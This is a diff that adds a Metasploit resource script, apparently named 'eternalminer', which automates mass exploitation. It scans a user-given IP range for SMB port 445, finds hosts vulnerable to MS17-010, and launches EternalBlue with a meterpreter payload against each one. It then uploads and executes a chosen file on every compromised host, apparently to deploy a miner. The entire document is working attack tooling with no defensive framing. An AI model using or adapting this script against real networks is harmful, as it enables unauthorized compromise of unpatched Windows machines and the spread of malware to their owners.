@@ -1,0 +1,48 @@
+#name of resource script
+workspace -a eternalminer
+
+#get user input
+<ruby>
+puts 'What IP range do you want to exploit? '
+ip = gets
+puts 'Which file do you want to run post exploit? '
+file = gets
+
+#create script
+autorun_file = File.new("autorun.rc", "w")
+autorun_file.puts("upload #{file}")
+autorun_file.puts("execute -f #{file}")
+autorun_file.close
+
+#run nmap
+run_single("db_nmap -Pn -p 445 --open #{ip}")
+</ruby>
+
+#EternalBlue scanner
+use auxiliary/scanner/smb/smb_ms17_010
+<ruby>
+
+#set scanned targets
+run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
+</ruby>
+run
+<ruby>
+
+#get all vulnerable hosts
+all_hosts = framework.db.hosts.map(&:address)
+a = framework.db.vulns.map(&:host_id).map{|x| x-1}
+vulnerable_hosts = a.map{|i| all_hosts[i]}
+
+#exploit vulnerable hosts
+run_single("use exploit/windows/smb/ms17_010_eternalblue")
+run_single("set RHOST #{vulnerable_hosts.join(' ')}")
+
+#meterpreter session to run script
+run_single("set payload windows/x64/meterpreter/bind_tcp")
+run_single("set AutoRunScript multi_console_command -r autorun.rc")
+
+#executes script on each exploited host
+vulnerable_hosts.each do |rhost|
+	run_single("set RHOST #{rhost}")
+	run_single("exploit -j -z")
+end
